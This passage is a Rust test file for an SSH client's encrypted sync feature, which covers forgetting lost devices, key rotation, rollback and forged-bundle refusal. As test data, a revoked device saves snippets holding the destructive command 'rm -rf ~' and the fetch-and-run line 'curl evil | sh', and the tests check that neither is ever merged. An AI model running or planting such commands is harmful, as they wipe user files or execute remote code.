async fn forgotten_device_cannot_read_or_write_new_epoch() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    let l = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    sync(&a).await;
    sync(&b).await;
    let bundle = bundle_id(&a);
    let l_id = id_of(&l);
    let dk = stored_key(&l, &bundle, 1);
    // Refusals: this device, an unknown id.
    let me = a
        .engine
        .sync_forget_device(ForgetDevice {
            device_ids: vec![id_of(&a)],
            authorization: RotateAuth::CurrentPassphrase(secret(STRONG)),
            new_passphrase: typed(STRONG_2),
            remember_key: true,
        })
        .await
        .expect_err("self");
    assert_eq!(me.summary().code, "sync_forget_self");
    let unknown = a
        .engine
        .sync_forget_device(ForgetDevice {
            device_ids: vec!["ab".repeat(16)],
            authorization: RotateAuth::CurrentPassphrase(secret(STRONG)),
            new_passphrase: typed(STRONG_2),
            remember_key: true,
        })
        .await
        .expect_err("unknown");
    assert_eq!(unknown.summary().code, "sync_device_unknown");
    let preview = a
        .engine
        .sync_forget_preview(l_id.clone())
        .await
        .expect("preview");
    assert!(preview.label.starts_with("Lost ("));
    let outcome = forget(&a, vec![l_id.clone()], STRONG, STRONG_2).await;
    assert_eq!(outcome.forgotten.len(), 1);
    assert!(outcome.forgotten.iter().all(|f| f.starts_with("Lost (")));
    assert!(outcome.exposed_accounts.is_empty());
    unlock(&b, STRONG_2).await.expect("adopt");
    // L's file is gone; neither its key nor its passphrase opens N + 1.
    assert!(sim.with(|s| !s.files.contains_key(&format!("devices/{l_id}.snap"))));
    let text = folder_bundle(&sim);
    assert!(bundle::open_with_key(&text, &dk).is_err());
    assert!(bundle::open(&text, &secret(STRONG), &KdfBounds::TEST).is_err());
    let devices = a.engine.sync_devices().await.expect("devices");
    assert!(devices.iter().all(|d| d.id != l_id), "{devices:?}");
    // L stops; its old passphrase does nothing; what it writes is ignored.
    assert_eq!(code(l.engine.sync_now().await), "sync_keys_rotated");
    assert_eq!(code(unlock(&l, STRONG).await), "sync_wrong_passphrase");
    l.engine
        .save_snippet(snippet("Evil", "rm -rf ~"))
        .await
        .expect("s");
    let forged_name = format!("devices/{l_id}.snap");
    put_file(&sim, &forged_name, b"anything".to_vec());
    sync(&a).await;
    sync(&b).await;
    assert!(sim.with(|s| !s.files.contains_key(&forged_name)), "removed");
    for device in [&a, &b] {
        assert!(
            device
                .engine
                .snippets()
                .await
                .expect("s")
                .iter()
                .all(|s| s.name != "Evil")
        );
    }
    assert!(!has_key(&a, &bundle, 1) && !has_key(&b, &bundle, 1));
}

#[tokio::test]
async fn forgotten_device_with_new_passphrase_sees_device_forgotten() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let l = device(&sim);
    create(&a, &folder).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    sync(&a).await;
    let bundle = bundle_id(&a);
    forget(&a, vec![id_of(&l)], STRONG, STRONG_2).await;
    let error = unlock(&l, STRONG_2).await.expect_err("forgotten");
    assert_eq!(error.summary().code, "sync_device_forgotten");
    assert!(
        error.summary().message.contains("Laptop ("),
        "{}",
        error.summary().message
    );
    let status = l.engine.sync_status().await.expect("s").status;
    assert!(
        matches!(&status, SyncStatus::Alert { kind: AlertKind::DeviceForgotten, device: Some(by) } if by.starts_with("Laptop (")),
        "{status:?}"
    );
    // Nothing was written: no key of the new epoch, no transition.
    assert!(!has_key(&l, &bundle, 2));
    assert!(!l.paths.sync_dir().join("rotation.toml").exists());
    assert_eq!(epoch_of(&l), 1);
    // "Turn sync off" works; joining again as a new device too.
    l.engine
        .sync_disable(DisableOptions::default())
        .await
        .expect("disable");
    join_named(&l, &folder, "Lost again", STRONG_2).await;
    assert_eq!(epoch_of(&l), 2);
}

/// A snapshot of `device` (a device holding the key of the bundle opened
/// with `passphrase`) with any state.
fn forge_snapshot_as(
    sim: &SimFolder,
    passphrase: &str,
    device: crate::sync::DeviceId,
    seq: u64,
    clock: u64,
    state_json: &str,
) {
    forge_snapshot_version(sim, passphrase, device, seq, clock, state_json, "0.7.0");
}

fn forge_snapshot_version(
    sim: &SimFolder,
    passphrase: &str,
    device: crate::sync::DeviceId,
    seq: u64,
    clock: u64,
    state_json: &str,
    app_version: &str,
) {
    use crate::sync::container::{Binding, SnapshotContent, seal_snapshot};
    let text = folder_bundle(sim);
    let opened = bundle::open(&text, &secret(passphrase), &KdfBounds::TEST).expect("open");
    let state: crate::sync::model::SyncState = serde_json::from_str(state_json).expect("state");
    let content = SnapshotContent {
        device_name: crate::sync::clock::DeviceName::parse("Relay").expect("name"),
        app_version: app_version.into(),
        published_at: 0,
        clock,
        seen: std::collections::BTreeMap::new(),
        state,
    };
    let binding = Binding {
        bundle_id: opened.header.bundle_id,
        epoch: opened.header.epoch,
        keyset_generation: opened.header.keyset_generation,
        device,
        seq,
    };
    let sealed = seal_snapshot(&opened.keys, &binding, &content).expect("seal");
    put_file(
        sim,
        &format!("devices/{device}.snap"),
        sealed.text.into_bytes(),
    );
}

#[tokio::test]
async fn forgotten_device_writes_relayed_by_stale_device_are_dropped() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    let l = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    sync(&a).await;
    let l_id = id_of(&l);
    forget(&a, vec![l_id.clone()], STRONG, STRONG_2).await;
    unlock(&b, STRONG_2).await.expect("adopt");
    let b_id = crate::sync::DeviceId::from_hex(&id_of(&b)).expect("id");
    // B's key is used by someone who relays L's later writes (context
    // beyond L's exact bound): never merged, the relay is named.
    forge_snapshot_as(
        &sim,
        STRONG_2,
        b_id,
        1000,
        50,
        &format!(r#"{{"context":{{"{b_id}":50,"{l_id}":999}},"records":[]}}"#),
    );
    let status = sync(&a).await;
    assert!(
        matches!(&status, SyncStatus::Alert { kind: AlertKind::RevokedWrites, device: Some(d) } if d.contains('(')),
        "{status:?}"
    );
    let codes = issue_codes(&a.engine.sync_issues().await.expect("issues"));
    assert!(
        codes.contains(&"sync_revoked_writes".to_owned()),
        "{codes:?}"
    );
}

#[tokio::test]
async fn revoked_entries_are_never_pruned() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let l = device(&sim);
    let m = device(&sim);
    create(&a, &folder).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    join_named(&m, &folder, "Mislaid", STRONG).await;
    sync(&a).await;
    forget(&a, vec![id_of(&l)], STRONG, STRONG_2).await;
    forget(&a, vec![id_of(&m)], STRONG_2, STRONG_3).await;
    rotate(&a, STRONG_3, STRONG_4).await;
    // An older passphrase is refused for a rotation (history of slots).
    let reused = a
        .engine
        .sync_rotate_keys(RotateKeys {
            authorization: RotateAuth::CurrentPassphrase(secret(STRONG_4)),
            new_passphrase: typed(STRONG),
            remember_key: true,
        })
        .await
        .expect_err("reused");
    assert_eq!(reused.summary().code, "sync_passphrase_reused");
    rotate(&a, STRONG_4, STRONG_5).await;
    let text = folder_bundle(&sim);
    let opened = bundle::open(&text, &secret(STRONG_5), &KdfBounds::TEST).expect("open");
    let revoked: BTreeSet<String> = opened
        .roster
        .revoked
        .iter()
        .map(|entry| entry.id.to_string())
        .collect();
    assert_eq!(revoked, [id_of(&l), id_of(&m)].into());
    assert_eq!(opened.header.epoch, 5);
    assert!(
        opened
            .roster
            .revoked
            .iter()
            .all(|entry| entry.revoked_by.to_string() == id_of(&a))
    );
}

#[tokio::test]
async fn fork_by_device_forgotten_later_cannot_be_adopted() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let l = device(&sim);
    create(&a, &folder).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    sync(&a).await;
    let old = folder_bundle(&sim);
    let l_previous = sim
        .with(|s| s.files.get(&snap_key(&l)).cloned())
        .expect("l");
    // L rotates first (its own lineage, L active in it) …
    rotate(&l, STRONG, STRONG_3).await;
    let l_bundle = folder_bundle(&sim);
    // … A does not see it yet and forgets L.
    put_file(&sim, "bundle.toml", old.into_bytes());
    put_file(&sim, &snap_key(&l), l_previous);
    forget(&a, vec![id_of(&l)], STRONG, STRONG_2).await;
    // The provider keeps L's bundle: a fork from the common epoch.
    put_file(&sim, "bundle.toml", l_bundle.into_bytes());
    assert_eq!(code(a.engine.sync_now().await), "sync_rotation_conflict");
    // E2: its roster still lists L, which A forgot: refused, named.
    let error = a
        .engine
        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_3)))
        .await
        .expect_err("refused");
    assert_eq!(error.summary().code, "sync_rotation_conflict");
    assert!(
        error.summary().message.contains("Lost ("),
        "{}",
        error.summary().message
    );
    assert_eq!(epoch_of(&a), 2);
    // Keeping A's keys converges past the fork.
    a.engine
        .sync_resolve_rotation_conflict(RotationChoice::KeepMine {
            new_passphrase: typed(STRONG_4),
            remember_key: true,
        })
        .await
        .expect("keep mine");
    assert_eq!(folder_epoch(&sim), 3);
    assert!(matches!(sync(&a).await, SyncStatus::Idle { .. }));
}

// ── Keychain entries (§13.3.8, R15) ───────────────────────────────────────

#[tokio::test]
async fn orphan_key_entries_listed_and_removed() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    let bundle = bundle_id(&a);
    assert!(a.engine.sync_key_entries().await.expect("list").is_empty());
    // An old key of another bundle, written through the engine's store.
    let other = SecretKey::SyncDataKey {
        bundle: "cd".repeat(16),
        epoch: 4,
    };
    a.engine
        .config()
        .secrets
        .set(&other, &secret("AAAA"))
        .expect("set");
    let entries = a.engine.sync_key_entries().await.expect("list");
    assert_eq!(entries.len(), 1);
    let entry = entries.first().expect("entry");
    assert_eq!(entry.account, other.account());
    assert!(!entry.this_bundle);
    a.engine
        .sync_remove_key_entry(entry.account.clone())
        .await
        .expect("remove");
    assert!(!a.secrets.contains(&other).expect("c"));
    assert!(a.engine.sync_key_entries().await.expect("list").is_empty());
    assert!(has_key(&a, &bundle, 1), "the key in use stays");
}

#[tokio::test]
async fn sync_remove_key_entry_refuses_non_sync_key_accounts() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    let bundle = bundle_id(&a);
    let password = SecretKey::HostPassword {
        user: "root".into(),
        host: "db".into(),
        port: 22,
        host_key: "SHA256:abc".into(),
    };
    a.engine
        .config()
        .secrets
        .set(&password, &secret("hunter2"))
        .expect("set");
    let current = SecretKey::SyncDataKey {
        bundle: bundle.clone(),
        epoch: 1,
    }
    .account();
    let not_indexed = SecretKey::SyncDataKey {
        bundle: "ef".repeat(16),
        epoch: 2,
    };
    a.secrets.set(&not_indexed, &secret("AAAA")).expect("set");
    for (account, expected) in [
        (password.account(), "sync_key_entry_invalid"),
        ("passphrase:SHA256:abc".to_owned(), "sync_key_entry_invalid"),
        (
            "unbound-password:root@db:22".to_owned(),
            "sync_key_entry_invalid",
        ),
        (not_indexed.account(), "sync_key_entry_invalid"),
        (format!("sync-key:{bundle}:01"), "sync_key_entry_invalid"),
        (current, "sync_key_entry_current"),
    ] {
        let error = a
            .engine
            .sync_remove_key_entry(account.clone())
            .await
            .expect_err("refused");
        assert_eq!(error.summary().code, expected, "{account}");
    }
    assert!(a.secrets.contains(&password).expect("c"), "never touched");
    assert!(has_key(&a, &bundle, 1));
}

// ── 0.6.0 compatibility (§13.2, R13) ──────────────────────────────────────

/// What a 0.6.0 device does first with `bundle.toml` (S1's parser: the
/// size cap, then the version probe, before any derivation).
fn read_as_0_6(text: &str) -> crate::sync::SyncError {
    #[derive(serde::Deserialize)]
    struct Probe {
        version: Option<u32>,
    }
    if text.len() > 64 * 1024 {
        return crate::sync::SyncError::TooLarge {
            what: "bundle.toml",
            max: 64 * 1024,
        };
    }
    let probe: Probe = toml::from_str(text).expect("toml");
    match probe.version {
        Some(1) => crate::sync::SyncError::Locked,
        found => crate::sync::SyncError::UnsupportedVersion {
            what: "bundle.toml",
            found: found.unwrap_or(0),
            supported: 1,
        },
    }
}

#[tokio::test]
async fn peer_on_0_6_sees_sync_version() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    let preview = a.engine.sync_rotation_preview().await.expect("preview");
    assert!(preview.format_upgrade);
    rotate(&a, STRONG, STRONG_2).await;
    let summary = crate::Error::from(read_as_0_6(&folder_bundle(&sim))).summary();
    assert_eq!(summary.code, "sync_version");
}

#[tokio::test]
async fn leave_roster_with_0_6_peer_gives_sync_version_not_a_silent_stall() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    // A 0.6 peer is announced as outdated before any S2 operation.
    let old = device(&sim);
    join_named(&old, &folder, "Old", STRONG).await;
    let old_id = crate::sync::DeviceId::from_hex(&id_of(&old)).expect("id");
    forge_snapshot_version(
        &sim,
        STRONG,
        old_id,
        1000,
        0,
        r#"{"context":{},"records":[]}"#,
        "0.5.9",
    );
    sync(&b).await;
    let preview = b.engine.sync_rotation_preview().await.expect("preview");
    assert_eq!(preview.outdated.len(), 1, "{preview:?}");
    assert!(
        preview
            .outdated
            .iter()
            .all(|label| label.starts_with("Old (")),
        "{preview:?}"
    );
    let b_id = id_of(&b);
    b.engine
        .sync_disable(DisableOptions {
            forget_key: true,
            remove_my_file: true,
            leave_roster: true,
        })
        .await
        .expect("leave");
    let text = folder_bundle(&sim);
    assert_eq!(
        crate::Error::from(read_as_0_6(&text)).summary().code,
        "sync_version",
        "the 0.6 peer is told to update, not silently stalled"
    );
    let opened = bundle::open(&text, &secret(STRONG), &KdfBounds::TEST).expect("open");
    let entry = opened
        .roster
        .revoked
        .iter()
        .find(|e| e.id.to_string() == b_id)
        .expect("left");
    assert_eq!(entry.revoked_by.to_string(), b_id, "by itself");
    assert!(
        opened
            .roster
            .devices
            .iter()
            .all(|d| d.id.to_string() != b_id)
    );
    // A keeps syncing (its own epoch, v2 now).
    assert!(!matches!(
        sync(&a).await,
        SyncStatus::Alert { .. } | SyncStatus::Error { .. }
    ));
}

#[tokio::test]
async fn downgrade_to_0_6_can_still_disable() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    rotate(&a, STRONG, STRONG_2).await;
    // `sync.toml` keeps the S1 shape (0.6 parses it with unknown fields
    // refused): the same struct, nothing added.
    let text = std::fs::read_to_string(a.paths.sync_dir().join("sync.toml")).expect("read");
    let keys: BTreeSet<String> = toml::from_str::<toml::Table>(&text)
        .expect("toml")
        .keys()
        .cloned()
        .collect();
    let s1: BTreeSet<String> = [
        "version",
        "folder",
        "root",
        "bundle_id",
        "epoch",
        "device",
        "remember_key",
        "excluded",
    ]
    .iter()
    .map(|k| (*k).to_owned())
    .collect();
    assert!(keys.is_subset(&s1), "{keys:?}");
    // Disabling needs neither the bundle nor the replica.
    std::fs::write(
        a.paths.sync_dir().join("replica.snap"),
        b"from a newer Portico",
    )
    .expect("w");
    a.engine
        .sync_disable(DisableOptions::default())
        .await
        .expect("disable");
    assert_eq!(
        a.engine.sync_status().await.expect("s").status,
        SyncStatus::Disabled
    );
}

// ── The lost-device drill (S2a exit criterion, §13.8) ─────────────────────

/// Every event received so far, as text (hygiene checks).
fn drain_text(events: &mut tokio::sync::broadcast::Receiver<EngineEvent>) -> String {
    let mut text = String::new();
    while let Ok(event) = events.try_recv() {
        let _ = writeln!(text, "{event:?}");
    }
    text
}

fn random_link(epoch: u32) -> bundle::LineageLink {
    bundle::LineageLink {
        epoch,
        digest: crate::sync::crypto::random_array().expect("rng"),
        proof: crate::sync::crypto::random_array().expect("rng"),
    }
}

fn random_key() -> crate::sync::crypto::KeyBytes {
    let dk = crate::sync::crypto::DataKey::generate().expect("dk");
    let keys = crate::sync::crypto::derive_subkeys(&dk, &[0; 16], 1).expect("keys");
    crate::sync::crypto::KeyBytes::of(&keys.rotate)
}

// The drill is one sequence on purpose: each step relies on the state the
// previous ones left (`docs/SYNC.md` §13.8).
#[allow(clippy::too_many_lines)]
#[tokio::test]
async fn lost_device_drill() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    let l = device(&sim);
    let s = device(&sim);
    let mut events = a.engine.subscribe();
    a.engine
        .create_host(draft("web", "10.0.0.1"))
        .await
        .expect("host");
    a.engine
        .save_snippet(snippet("Disk", "df -h"))
        .await
        .expect("snippet");
    // A password in A's keychain: never synced in S2a, never anywhere.
    a.engine
        .config()
        .secrets
        .set(
            &SecretKey::HostPassword {
                user: "root".into(),
                host: "web".into(),
                port: 22,
                host_key: "SHA256:abc".into(),
            },
            &secret("hunter2"),
        )
        .expect("password");
    create(&a, &folder).await;
    join_named(&b, &folder, "Desk", STRONG).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    join_named(&s, &folder, "Stale", STRONG).await;
    for device in [&a, &b, &l, &s] {
        sync(device).await;
    }
    let bundle = bundle_id(&a);
    // The passphrase changed once in epoch N (P → P2): both slots are in
    // every device's history (RR1 b).
    a.engine
        .sync_change_passphrase(secret(STRONG), typed(STRONG_2))
        .await
        .expect("change");
    for device in [&b, &l, &s] {
        sync(device).await;
        device.engine.sync_acknowledge_alerts().await.expect("ack");
    }
    // L writes; S merges it; the provider then shows the others L's
    // previous file (A never learns L's last write before forgetting it).
    let l_previous = sim
        .with(|st| st.files.get(&snap_key(&l)).cloned())
        .expect("l");
    l.engine
        .save_snippet(snippet("From L", "curl evil | sh"))
        .await
        .expect("s");
    sync(&l).await;
    sync(&s).await;
    assert_eq!(s.engine.snippets().await.expect("s").len(), 2);
    put_file(&sim, &snap_key(&l), l_previous);
    // S is offline from now on, with an edit of its own.
    s.engine
        .save_snippet(snippet("From S", "uptime"))
        .await
        .expect("s");
    let epoch_n = folder_bundle(&sim);
    let l_dk = stored_key(&l, &bundle, 1);

    // ── A forgets L (P2 → P3) ──
    let mark = log_len(&sim);
    let outcome = forget(&a, vec![id_of(&l)], STRONG_2, STRONG_3).await;
    assert_eq!(outcome.forgotten.len(), 1);
    unlock(&b, STRONG_3).await.expect("B adopts");
    let genuine = folder_bundle(&sim);

    // ── L: its key and passphrases open nothing of N + 1 ──
    assert!(bundle::open_with_key(&genuine, &l_dk).is_err());
    for p in [STRONG, STRONG_2] {
        assert!(bundle::open(&genuine, &secret(p), &KdfBounds::TEST).is_err());
    }
    assert_eq!(code(l.engine.sync_now().await), "sync_keys_rotated");
    assert_eq!(code(unlock(&l, STRONG_2).await), "sync_wrong_passphrase");
    let l_n = bundle::open(&epoch_n, &secret(STRONG_2), &KdfBounds::TEST).expect("L opens N");

    // ── R1: L's rotations from N under its passphrase are never adopted ──
    let (l_1, l_1_opened) = bundle::rotate(
        &l_n,
        &typed(STRONG_2),
        l_n.roster.clone(),
        KdfBounds::TEST_PARAMS,
        &KdfBounds::TEST,
    )
    .expect("forge N+1");
    let (l_2, _) = bundle::rotate(
        &l_1_opened,
        &typed(STRONG_2),
        l_n.roster.clone(),
        KdfBounds::TEST_PARAMS,
        &KdfBounds::TEST,
    )
    .expect("forge N+2");
    put_file(&sim, "bundle.toml", l_2.clone().into_bytes());
    for device in [&a, &b] {
        // A fork from N (L held DK_N): a conflict, never an adoption.
        assert_eq!(
            code(device.engine.sync_now().await),
            "sync_rotation_conflict"
        );
        let refused = device
            .engine
            .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_2)))
            .await
            .expect_err("refused");
        assert_eq!(refused.summary().code, "sync_rotation_conflict");
        assert!(refused.summary().message.contains("Lost ("));
        assert_eq!(epoch_of(device), 2);
    }
    assert_eq!(folder_bundle(&sim), l_2, "no rewrite war");
    // S, still at N: the chain from N is authentic, the passphrase is not.
    assert_eq!(code(s.engine.sync_now().await), "sync_keys_rotated");
    assert_eq!(code(unlock(&s, STRONG_2).await), "sync_passphrase_reused");
    put_file(&sim, "bundle.toml", l_1.clone().into_bytes());
    assert_eq!(code(unlock(&s, STRONG_2).await), "sync_passphrase_reused");

    // ── RR1 a: a jump copying the authentic links, then L's own ──
    let clear = bundle::peek(&genuine).expect("peek");
    let mut links = clear.links.clone();
    links.push(bundle::LineageLink {
        epoch: 2,
        digest: clear.commit.expect("v2"),
        proof: [9; 32],
    });
    links.push(random_link(3));
    let keys = vec![
        (1, crate::sync::crypto::KeyBytes::of(&l_n.keys.rotate)),
        (2, random_key()),
        (3, random_key()),
    ];
    let (jump, _) = bundle::tests::forge(
        clear.bundle_id,
        4,
        1,
        l_n.roster.clone(),
        links,
        keys,
        None,
        STRONG_2,
    );
    put_file(&sim, "bundle.toml", jump.clone().into_bytes());
    // B (at N + 1): a link from its own C with a false proof: forged from
    // its lineage, rewritten from bundle.verified.
    assert_eq!(code(b.engine.sync_now().await), "sync_bundle_tampered");
    assert_eq!(folder_epoch(&sim), 2, "rewritten");
    // S (at N): the copied link N proves N + 1, but the file cannot prove
    // its own links: never adopted.
    put_file(&sim, "bundle.toml", jump.into_bytes());
    assert_eq!(code(s.engine.sync_now().await), "sync_keys_rotated");
    let jumped = unlock(&s, STRONG_2).await.expect_err("never adopted");
    assert!(
        ["sync_bundle_tampered", "sync_passphrase_reused"]
            .contains(&jumped.summary().code.as_str()),
        "{jumped:?}"
    );

    // ── RR1 b: a rotation under the passphrase of an earlier generation ──
    let (old_gen, _) = bundle::rotate(
        &l_n,
        &typed(STRONG),
        l_n.roster.clone(),
        KdfBounds::TEST_PARAMS,
        &KdfBounds::TEST,
    )
    .expect("forge under P");
    put_file(&sim, "bundle.toml", old_gen.into_bytes());
    assert_eq!(code(unlock(&s, STRONG).await), "sync_passphrase_reused");
    put_file(&sim, "bundle.toml", genuine.clone().into_bytes());
    for device in [&a, &b] {
        let _ = device.engine.sync_now().await;
        assert!(matches!(
            sync(device).await,
            SyncStatus::Idle { .. } | SyncStatus::Waiting { .. }
        ));
    }

    // ── R2: the old bundle put back never makes anyone publish under N ──
    put_file(&sim, "bundle.toml", epoch_n.clone().into_bytes());
    assert_eq!(code(a.engine.sync_now().await), "sync_rollback");
    assert_eq!(folder_epoch(&sim), 2, "A rewrites it from bundle.verified");
    put_file(&sim, "bundle.toml", epoch_n.clone().into_bytes());
    // The other Portico process of A (fresh memory, same keychain).
    let a_gui = restart(&a, &sim);
    assert_eq!(code(a_gui.sync_now().await), "sync_rollback");
    put_file(&sim, "bundle.toml", epoch_n.clone().into_bytes());
    // B stops remembering its key; the old passphrase opens N, below its
    // floor: refused, nothing stored.
    b.engine
        .sync_set_options(SyncOptions {
            remember_key: false,
        })
        .await
        .expect("options");
    let b_locked = restart(&b, &sim);
    assert_eq!(
        b_locked
            .sync_unlock(secret(STRONG_2))
            .await
            .expect_err("below the floor")
            .summary()
            .code,
        "sync_rollback"
    );
    assert!(!has_key(&b, &bundle, 1));
    // S (never saw N + 1 adopted) stops on the newer snapshot headers.
    assert_eq!(code(s.engine.sync_now().await), "sync_keys_rotated");
    // A new device never joins the put-back bundle.
    let newcomer = device(&sim);
    let refused = newcomer
        .engine
        .sync_join_preview(SyncJoin {
            folder: folder.clone(),
            passphrase: secret(STRONG_2),
            device_name: "New".into(),
            remember_key: true,
        })
        .await
        .expect_err("refused");
    assert_eq!(refused.summary().code, "sync_rollback");
    put_file(&sim, "bundle.toml", genuine.into_bytes());
    let _ = b_locked.sync_unlock(secret(STRONG_3)).await;
    let _ = a.engine.sync_now().await;

    // ── R3: S applied L's late write before learning the rotation ──
    unlock(&s, STRONG_3).await.ok();
    let status = sync(&s).await;
    assert!(!matches!(status, SyncStatus::Error { .. }), "{status:?}");
    let held = s.engine.sync_revoked_values().await.expect("held");
    assert_eq!(held.len(), 1, "{held:?}");
    let item = held.first().expect("held").clone();
    assert!(
        item.device
            .as_deref()
            .is_some_and(|d| d.starts_with("Lost ("))
    );
    sync(&a).await;
    let a_names: BTreeSet<String> = a
        .engine
        .snippets()
        .await
        .expect("s")
        .into_iter()
        .map(|sn| sn.name)
        .collect();
    assert!(a_names.contains("From S"), "{a_names:?}");
    assert!(
        !a_names.contains("From L"),
        "never republished: {a_names:?}"
    );
    s.engine
        .sync_revoked_value(item.key, crate::sync::api::RevokedValueChoice::TakeSynced)
        .await
        .expect("decide");
    sync(&s).await;
    assert!(
        s.engine
            .snippets()
            .await
            .expect("s")
            .iter()
            .all(|sn| sn.name != "From L"),
        "taken from the others: deleted here"
    );
    assert!(
        s.engine
            .sync_revoked_values()
            .await
            .expect("held")
            .is_empty()
    );

    // ── End: nothing written since the rotation opens with DK_N; the old
    // key is in no remaining keychain; no secret anywhere ──
    for (key, epoch) in snapshot_epochs_since(&sim, mark) {
        assert!(epoch >= 2, "{key} published under epoch {epoch}");
    }
    let bundles: Vec<Vec<u8>> = sim.with(|st| {
        st.log
            .iter()
            .skip(mark)
            .filter(|(key, _)| key == "bundle.toml")
            .map(|(_, bytes)| bytes.clone())
            .collect()
    });
    for bytes in bundles {
        let text = String::from_utf8(bytes).expect("utf8");
        assert!(bundle::peek(&text).expect("peek").epoch >= 2);
        assert!(bundle::open_with_key(&text, &l_dk).is_err());
    }
    for device in [&a, &b, &s] {
        assert!(!has_key(device, &bundle, 1));
    }
    let all_files = sim.with(|st| {
        st.files
            .values()
            .chain(st.log.iter().map(|(_, bytes)| bytes))
            .any(|bytes| String::from_utf8_lossy(bytes).contains("hunter2"))
    });
    assert!(!all_files, "no password in the folder");
    let mut text = drain_text(&mut events);
    for device in [&a, &b, &s] {
        let issues = device.engine.sync_issues().await.expect("i");
        let status = device.engine.sync_status().await.expect("s");
        let _ = write!(text, "{issues:?}{status:?}");
    }
    for needle in ["hunter2", STRONG, STRONG_2, STRONG_3] {
        assert!(!text.contains(needle), "{needle} leaked");
    }
}

#[tokio::test]
async fn concurrent_rotation_during_rotation_pending_raises_conflict_not_rewrite_war() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let c = device(&sim);
    create(&a, &folder).await;
    join(&c, &folder, JoinBulkChoice::ReviewEach).await;
    // A's step 4 times out (and does not land): its rotation is pending.
    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
    let outcome = rotate(&a, STRONG, STRONG_2).await;
    assert!(matches!(
        outcome.status,
        SyncStatus::Waiting {
            reason: WaitReason::RotationPending,
            ..
        }
    ));
    // C rotates from the same epoch and lands first.
    rotate(&c, STRONG, STRONG_3).await;
    let c_bundle = folder_bundle(&sim);
    for _ in 0..3 {
        assert_eq!(code(a.engine.sync_now().await), "sync_rotation_conflict");
        assert_eq!(folder_bundle(&sim), c_bundle, "never rewritten");
    }
    // Keeping A's keys replaces its pending transition one epoch further.
    a.engine
        .sync_resolve_rotation_conflict(RotationChoice::KeepMine {
            new_passphrase: typed(STRONG_4),
            remember_key: true,
        })
        .await
        .expect("keep mine");
    assert_eq!(folder_epoch(&sim), 3);
    assert_eq!(epoch_of(&a), 3);
    assert_eq!(code(c.engine.sync_now().await), "sync_rotation_conflict");
    c.engine
        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_4)))
        .await
        .expect("use A's");
    assert_eq!(epoch_of(&c), 3);
    assert!(matches!(sync(&a).await, SyncStatus::Idle { .. }));
}

#[tokio::test]
async fn pending_rotation_can_take_the_other_devices_keys() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let c = device(&sim);
    a.engine
        .save_snippet(snippet("From A", "true"))
        .await
        .expect("s");
    create(&a, &folder).await;
    join(&c, &folder, JoinBulkChoice::ReviewEach).await;
    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
    rotate(&a, STRONG, STRONG_2).await;
    rotate(&c, STRONG, STRONG_3).await;
    assert_eq!(code(a.engine.sync_now().await), "sync_rotation_conflict");
    // A gives up its pending transition for C's keys.
    a.engine
        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_3)))
        .await
        .expect("use C's");
    assert_eq!(epoch_of(&a), 2);
    assert!(!a.paths.sync_dir().join("rotation.toml").exists());
    sync(&c).await;
    assert_eq!(
        c.engine.snippets().await.expect("s").len(),
        1,
        "nothing lost"
    );
}

#[tokio::test]
async fn pending_forget_keeps_refusing_a_fork_that_brings_the_device_back() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let l = device(&sim);
    create(&a, &folder).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    sync(&a).await;
    // A's forget waits for the folder; L's own rotation lands meanwhile.
    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
    forget(&a, vec![id_of(&l)], STRONG, STRONG_2).await;
    rotate(&l, STRONG, STRONG_3).await;
    assert_eq!(code(a.engine.sync_now().await), "sync_rotation_conflict");
    let error = a
        .engine
        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_3)))
        .await
        .expect_err("E2");
    assert_eq!(error.summary().code, "sync_rotation_conflict");
    assert!(
        error.summary().message.contains("Lost ("),
        "{}",
        error.summary().message
    );
}

/// R3 on a device that does not remember its key (RR4): with the old
/// passphrase typed first, provenance is computed; without it, every local
/// difference is of unknown origin.
#[tokio::test]
async fn revoked_writes_applied_on_stale_device_are_not_republished_after_rejoin() {
    for old_passphrase_first in [true, false] {
        let (_dir, folder, sim) = shared();
        let a = device(&sim);
        let l = device(&sim);
        let s = device(&sim);
        create(&a, &folder).await;
        join_named(&l, &folder, "Lost", STRONG).await;
        join_named(&s, &folder, "Stale", STRONG).await;
        for device in [&a, &l, &s] {
            sync(device).await;
        }
        let l_previous = sim
            .with(|st| st.files.get(&snap_key(&l)).cloned())
            .expect("l");
        l.engine
            .save_snippet(snippet("From L", "curl evil | sh"))
            .await
            .expect("s");
        sync(&l).await;
        sync(&s).await;
        put_file(&sim, &snap_key(&l), l_previous);
        s.engine
